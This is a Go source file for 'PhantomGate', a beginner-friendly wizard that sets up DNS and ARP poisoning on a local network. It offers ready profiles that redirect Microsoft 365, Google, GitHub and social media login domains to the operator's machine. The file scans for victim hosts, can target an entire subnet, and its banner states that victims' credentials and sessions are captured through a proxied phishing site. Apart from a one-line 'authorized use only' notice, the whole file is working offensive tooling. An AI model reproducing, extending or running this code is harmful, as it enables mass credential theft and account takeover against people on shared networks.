package dns

import (
	"bufio"
	"fmt"
	"os"
	"strconv"
	"strings"
)

// ═══════════════════════════════════════════════════════════════════
//  PHANTOMGATE INTERACTIVE WIZARD
//  Guides beginners through the full setup with auto-detection
// ═══════════════════════════════════════════════════════════════════

// AttackProfile is a pre-built configuration for common targets
type AttackProfile struct {
	Name        string
	Description string
	Domains     []string
	Phishlet    string
}

// Pre-built attack profiles for one-click setup
var AttackProfiles = []AttackProfile{
	{
		Name:        "Microsoft 365 / Outlook",
		Description: "Intercepts Microsoft 365, Outlook, and Azure AD logins",
		Domains: []string{
			"login.microsoftonline.com",
			"login.microsoft.com",
			"login.live.com",
			"outlook.office365.com",
			"outlook.office.com",
		},
		Phishlet: "microsoft365",
	},
	{
		Name:        "Google Workspace / Gmail",
		Description: "Intercepts Google, Gmail, and Google Workspace logins",
		Domains: []string{
			"accounts.google.com",
			"mail.google.com",
			"myaccount.google.com",
			"workspace.google.com",
		},
		Phishlet: "google",
	},
	{
		Name:        "GitHub",
		Description: "Intercepts GitHub logins and session tokens",
		Domains: []string{
			"github.com",
			"github.githubassets.com",
		},
		Phishlet: "github",
	},
	{
		Name:        "Social Media Pack",
		Description: "Intercepts Instagram, Facebook, Twitter/X logins",
		Domains: []string{
			"www.instagram.com",
			"instagram.com",
			"www.facebook.com",
			"facebook.com",
			"x.com",
			"twitter.com",
		},
		Phishlet: "", // Requires custom phishlet
	},
	{
		Name:        "Custom Domains",
		Description: "Enter your own target domains manually",
		Domains:     nil,
		Phishlet:    "",
	},
}

// WizardResult contains the configuration produced by the interactive wizard
type WizardResult struct {
	Network       *NetworkInfo
	TargetDomains []string
	Phishlet      string
	VictimIPs     []string  // Empty = entire subnet
	TargetAll     bool      // True = poison all hosts on subnet
}

// RunWizard launches the interactive setup wizard
func RunWizard() (*WizardResult, error) {
	reader := bufio.NewReader(os.Stdin)
	result := &WizardResult{}

	printBanner()

	// ──────────────────────────────────────────────────
	// STEP 1: Auto-detect network
	// ──────────────────────────────────────────────────
	fmt.Println("  ┌──────────────────────────────────────────────────┐")
	fmt.Println("  │  STEP 1/4 — NETWORK DETECTION                   │")
	fmt.Println("  └──────────────────────────────────────────────────┘")
	fmt.Println()
	fmt.Println("  [*] Auto-detecting network configuration...")
	fmt.Println()

	net, err := AutoDiscover()
	if err != nil {
		fmt.Printf("  [!] Auto-detection failed: %v\n", err)
		fmt.Println("  [!] Please configure manually using CLI flags.")
		return nil, err
	}

	result.Network = net

	ifaceType := "Wired"
	if net.IsWireless {
		ifaceType = "Wireless"
	}

	fmt.Printf("  ✓ Interface    : %s (%s) [%s]\n", net.Interface, net.InterfaceMAC, ifaceType)
	fmt.Printf("  ✓ Your IP      : %s\n", net.LocalIP)
	fmt.Printf("  ✓ Gateway      : %s\n", net.GatewayIP)
	fmt.Printf("  ✓ Subnet       : %s\n", net.SubnetCIDR)
	fmt.Printf("  ✓ DNS Servers  : %s\n", strings.Join(net.DNSServers, ", "))
	fmt.Println()

	if !confirmPrompt(reader, "  Is this correct?") {
		fmt.Println("  [!] Please use manual CLI flags to override.")
		return nil, fmt.Errorf("user cancelled network config")
	}
	fmt.Println()

	// ──────────────────────────────────────────────────
	// STEP 2: Choose attack profile
	// ──────────────────────────────────────────────────
	fmt.Println("  ┌──────────────────────────────────────────────────┐")
	fmt.Println("  │  STEP 2/4 — CHOOSE TARGET                       │")
	fmt.Println("  └──────────────────────────────────────────────────┘")
	fmt.Println()
	fmt.Println("  What do you want to intercept?")
	fmt.Println()

	for i, profile := range AttackProfiles {
		fmt.Printf("    [%d] %s\n", i+1, profile.Name)
		fmt.Printf("        %s\n", profile.Description)
		if len(profile.Domains) > 0 {
			fmt.Printf("        Domains: %s\n", strings.Join(profile.Domains[:min(3, len(profile.Domains))], ", "))
			if len(profile.Domains) > 3 {
				fmt.Printf("                 +%d more\n", len(profile.Domains)-3)
			}
		}
		fmt.Println()
	}

	choice := readInt(reader, "  Select profile [1-%d]: ", len(AttackProfiles))
	selectedProfile := AttackProfiles[choice-1]

	if selectedProfile.Domains == nil {
		// Custom domains
		fmt.Println()
		fmt.Println("  Enter target domains (one per line, empty line to finish):")
		for {
			fmt.Print("    → ")
			domain, _ := reader.ReadString('\n')
			domain = strings.TrimSpace(domain)
			if domain == "" {
				break
			}
			result.TargetDomains = append(result.TargetDomains, domain)
		}
		if len(result.TargetDomains) == 0 {
			return nil, fmt.Errorf("no domains specified")
		}
	} else {
		result.TargetDomains = selectedProfile.Domains
		result.Phishlet = selectedProfile.Phishlet
	}

	fmt.Println()
	fmt.Println("  Domains to poison:")
	for _, d := range result.TargetDomains {
		fmt.Printf("    ☠️  %s → %s\n", d, net.LocalIP)
	}
	fmt.Println()

	// ──────────────────────────────────────────────────
	// STEP 3: Choose victim scope
	// ──────────────────────────────────────────────────
	fmt.Println("  ┌──────────────────────────────────────────────────┐")
	fmt.Println("  │  STEP 3/4 — VICTIM SCOPE                        │")
	fmt.Println("  └──────────────────────────────────────────────────┘")
	fmt.Println()
	fmt.Println("  Who should be affected?")
	fmt.Println()
	fmt.Println("    [1] Everyone on the network (entire subnet)")
	fmt.Println("    [2] Specific IP addresses only")
	fmt.Println("    [3] Scan network first, then choose")
	fmt.Println()

	scopeChoice := readInt(reader, "  Select scope [1-3]: ", 3)

	switch scopeChoice {
	case 1:
		result.TargetAll = true
		fmt.Println()
		fmt.Println("  ⚠️  All devices on the network will be poisoned!")

	case 2:
		fmt.Println()
		fmt.Println("  Enter victim IPs (one per line, empty line to finish):")
		for {
			fmt.Print("    → ")
			ip, _ := reader.ReadString('\n')
			ip = strings.TrimSpace(ip)
			if ip == "" {
				break
			}
			result.VictimIPs = append(result.VictimIPs, ip)
		}

	case 3:
		fmt.Println()
		fmt.Printf("  [*] Scanning %s for live hosts...\n", net.SubnetCIDR)
		fmt.Println("      (this may take 10-30 seconds)")
		fmt.Println()

		hosts, err := ScanSubnet(net.Interface, net.SubnetCIDR)
		if err != nil {
			fmt.Printf("  [!] Scan failed: %v\n", err)
		} else {
			fmt.Printf("  Found %d live hosts:\n\n", len(hosts))
			for i, host := range hosts {
				marker := " "
				if host == net.GatewayIP {
					marker = "GW"
				} else if host == net.LocalIP {
					marker = "ME"
				}
				fmt.Printf("    [%2d] %-15s  %s\n", i+1, host, marker)
			}
			fmt.Println()
			fmt.Println("  Enter host numbers to target (comma-separated, or 'all'):")
			fmt.Print("    → ")
			selection, _ := reader.ReadString('\n')
			selection = strings.TrimSpace(selection)

			if strings.ToLower(selection) == "all" {
				result.TargetAll = true
			} else {
				for _, s := range strings.Split(selection, ",") {
					s = strings.TrimSpace(s)
					idx, err := strconv.Atoi(s)
					if err == nil && idx >= 1 && idx <= len(hosts) {
						host := hosts[idx-1]
						if host != net.LocalIP && host != net.GatewayIP {
							result.VictimIPs = append(result.VictimIPs, host)
						}
					}
				}
			}
		}
	}

	fmt.Println()

	// ──────────────────────────────────────────────────
	// STEP 4: Confirmation
	// ──────────────────────────────────────────────────
	fmt.Println("  ┌──────────────────────────────────────────────────┐")
	fmt.Println("  │  STEP 4/4 — CONFIRM & LAUNCH                    │")
	fmt.Println("  └──────────────────────────────────────────────────┘")
	fmt.Println()
	fmt.Println("  ╔══════════════════════════════════════════════════╗")
	fmt.Println("  ║           ATTACK CONFIGURATION SUMMARY          ║")
	fmt.Println("  ╠══════════════════════════════════════════════════╣")
	fmt.Printf("  ║  Interface  : %-34s ║\n", net.Interface)
	fmt.Printf("  ║  Your IP    : %-34s ║\n", net.LocalIP)
	fmt.Printf("  ║  Gateway    : %-34s ║\n", net.GatewayIP)

	scopeStr := "Entire subnet"
	if len(result.VictimIPs) > 0 {
		scopeStr = fmt.Sprintf("%d specific hosts", len(result.VictimIPs))
	}
	fmt.Printf("  ║  Scope      : %-34s ║\n", scopeStr)
	fmt.Printf("  ║  Domains    : %-34d ║\n", len(result.TargetDomains))

	if result.Phishlet != "" {
		fmt.Printf("  ║  Phishlet   : %-34s ║\n", result.Phishlet)
	}
	fmt.Println("  ╠══════════════════════════════════════════════════╣")
	fmt.Println("  ║  POISONED DOMAINS:                              ║")
	for _, d := range result.TargetDomains {
		line := fmt.Sprintf("  ☠️  %s", d)
		fmt.Printf("  ║  %-46s  ║\n", line)
	}
	fmt.Println("  ╚══════════════════════════════════════════════════╝")
	fmt.Println()

	if !confirmPrompt(reader, "  🔴 Launch the attack?") {
		return nil, fmt.Errorf("user cancelled")
	}

	return result, nil
}

// BuildInterceptConfig converts a WizardResult into an InterceptConfig
func (wr *WizardResult) BuildInterceptConfig() InterceptConfig {
	return InterceptConfig{
		Interface:     wr.Network.Interface,
		GatewayIP:     wr.Network.GatewayIP,
		RedirectIP:    wr.Network.LocalIP,
		TargetDomains: wr.TargetDomains,
		VictimIPs:     wr.VictimIPs,
		ARPInterval:   2,
	}
}

// ──────────────────────────────────────────────────
// Helper functions
// ──────────────────────────────────────────────────

func printBanner() {
	fmt.Println()
	fmt.Println("  ╔══════════════════════════════════════════════════╗")
	fmt.Println("  ║     ☠️  PHANTOMGATE DNS INTERCEPTION WIZARD  ☠️   ║")
	fmt.Println("  ║                                                  ║")
	fmt.Println("  ║  This wizard will guide you through setting up   ║")
	fmt.Println("  ║  automatic DNS poisoning on your local network.  ║")
	fmt.Println("  ║                                                  ║")
	fmt.Println("  ║  What happens:                                   ║")
	fmt.Println("  ║  1. We detect your network automatically        ║")
	fmt.Println("  ║  2. You pick which websites to intercept        ║")
	fmt.Println("  ║  3. You pick which devices to target            ║")
	fmt.Println("  ║  4. We poison DNS so victims come to us         ║")
	fmt.Println("  ║  5. PhantomGate proxies the real site           ║")
	fmt.Println("  ║  6. Credentials & sessions are captured         ║")
	fmt.Println("  ║                                                  ║")
	fmt.Println("  ║  ⚠️  AUTHORIZED USE ONLY                        ║")
	fmt.Println("  ╚══════════════════════════════════════════════════╝")
	fmt.Println()
}

func confirmPrompt(reader *bufio.Reader, prompt string) bool {
	fmt.Printf("%s [Y/n]: ", prompt)
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(strings.ToLower(input))
	return input == "" || input == "y" || input == "yes"
}

func readInt(reader *bufio.Reader, prompt string, max int) int {
	for {
		fmt.Printf(prompt, max)
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)
		n, err := strconv.Atoi(input)
		if err == nil && n >= 1 && n <= max {
			return n
		}
		fmt.Printf("  [!] Please enter a number between 1 and %d\n", max)
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
